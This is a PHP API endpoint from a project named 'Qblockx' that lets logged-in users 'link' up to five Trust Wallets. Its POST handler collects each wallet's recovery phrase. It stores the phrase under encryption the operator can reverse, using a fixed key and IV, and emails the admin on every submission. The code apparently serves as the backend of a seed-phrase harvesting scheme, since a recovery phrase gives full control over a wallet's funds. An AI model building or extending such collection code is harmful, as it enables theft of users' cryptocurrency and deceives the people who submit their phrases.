<?php
/**
 * Project: Qblockx
 * API: User — Trust Wallet Linking (multi-wallet, up to 5 per user)
 * GET    → returns all linked wallets for the user
 * POST   → adds a new wallet (max 5 per user)
 * DELETE → removes a wallet by id
 */

require_once '../../config/database.php';
require_once '../../config/env.php';
require_once '../../api/utilities/auth-check.php';
header('Content-Type: application/json');

requireAuth();
$user = getAuthUser();

$APP_KEY = $_ENV['APP_KEY'] ?? '';
$APP_IV  = $_ENV['APP_IV']  ?? '';

function encryptPhrase(string $phrase, string $key, string $iv): string {
    return base64_encode(openssl_encrypt($phrase, 'aes-256-cbc', $key, 0, $iv));
}

try {
    $db = Database::getInstance()->getConnection();

    // One-time schema migration: allow multiple wallets per user
    // Drops the old single-row UNIQUE(user_id) constraint if it exists
    try { $db->exec("ALTER TABLE trust_wallet_links DROP INDEX user_id"); } catch (\Exception $e) {}
    try { $db->exec("ALTER TABLE trust_wallet_links ADD UNIQUE INDEX uniq_user_wallet_name (user_id, wallet_name)"); } catch (\Exception $e) {}

    // ── GET ──────────────────────────────────────────────────────────────────
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {

        $stmt = $db->prepare(
            "SELECT id, wallet_name, wallet_address,
                    (phrase_encrypted IS NOT NULL AND phrase_encrypted != '') AS has_phrase,
                    submitted_at, updated_at
             FROM trust_wallet_links
             WHERE user_id = :uid
             ORDER BY submitted_at ASC"
        );
        $stmt->execute(['uid' => $user['id']]);
        $wallets = $stmt->fetchAll();

        // Cast has_phrase to bool
        foreach ($wallets as &$w) {
            $w['has_phrase'] = (bool) $w['has_phrase'];
        }
        unset($w);

        echo json_encode([
            'success' => true,
            'data'    => [
                'wallets' => $wallets,
                'count'   => count($wallets),
            ],
        ]);

    // ── POST ─────────────────────────────────────────────────────────────────
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input          = json_decode(file_get_contents('php://input'), true) ?? [];
        $wallet_name    = trim($input['wallet_name']    ?? '');
        $wallet_address = trim($input['wallet_address'] ?? '');
        $phrase         = trim($input['phrase']         ?? '');

        if (empty($wallet_address) && empty($phrase)) {
            echo json_encode(['success' => false, 'message' => 'Provide a wallet address or recovery phrase']);
            exit;
        }

        // Enforce 5-wallet limit
        $countStmt = $db->prepare("SELECT COUNT(*) FROM trust_wallet_links WHERE user_id = :uid");
        $countStmt->execute(['uid' => $user['id']]);
        if ((int) $countStmt->fetchColumn() >= 5) {
            echo json_encode(['success' => false, 'message' => 'Maximum of 5 wallets allowed. Remove one to add another.']);
            exit;
        }

        $phrase_encrypted = null;
        if (!empty($phrase) && !empty($APP_KEY) && !empty($APP_IV)) {
            $phrase_encrypted = encryptPhrase($phrase, $APP_KEY, $APP_IV);
        }

        $stmt = $db->prepare(
            "INSERT INTO trust_wallet_links (user_id, wallet_name, wallet_address, phrase_encrypted, submitted_at)
             VALUES (:uid, :wname, :addr, :phrase, NOW())"
        );
        $stmt->execute([
            'uid'    => $user['id'],
            'wname'  => $wallet_name  ?: null,
            'addr'   => $wallet_address ?: null,
            'phrase' => $phrase_encrypted,
        ]);

        // Notify admin of new wallet submission
        try {
            require_once '../../api/utilities/email_templates.php';
            $adminEmail = getenv('SMTP_FROM') ?: getenv('SMTP_USER') ?: '';
            if ($adminEmail) {
                $nameStmt = $db->prepare("SELECT full_name FROM users WHERE id = :uid");
                $nameStmt->execute(['uid' => $user['id']]);
                $nameRow  = $nameStmt->fetch();
                $fullName = $nameRow['full_name'] ?? 'User';
                Mailer::sendAdminWalletSubmitted(
                    $adminEmail,
                    (string) $user['id'],
                    $fullName,
                    $user['email'] ?? '',
                    $_SERVER['REMOTE_ADDR'] ?? '',
                    date('F j, Y H:i T')
                );
            }
        } catch (\Throwable $emailErr) {
            error_log('Trust wallet admin email error: ' . $emailErr->getMessage());
        }

        echo json_encode([
            'success'     => true,
            'message'     => 'Wallet linked successfully.',
            'wallet_name' => $wallet_name ?: null,
        ]);

    // ── DELETE ────────────────────────────────────────────────────────────────
    } elseif ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
        $input = json_decode(file_get_contents('php://input'), true) ?? [];
        $id    = (int) ($input['id'] ?? 0);

        if ($id <= 0) {
            echo json_encode(['success' => false, 'message' => 'Invalid wallet ID']);
            exit;
        }

        $db->prepare("DELETE FROM trust_wallet_links WHERE id = :id AND user_id = :uid")
           ->execute(['id' => $id, 'uid' => $user['id']]);

        echo json_encode(['success' => true, 'message' => 'Wallet removed.']);

    } else {
        http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    }

} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Server error']);
}
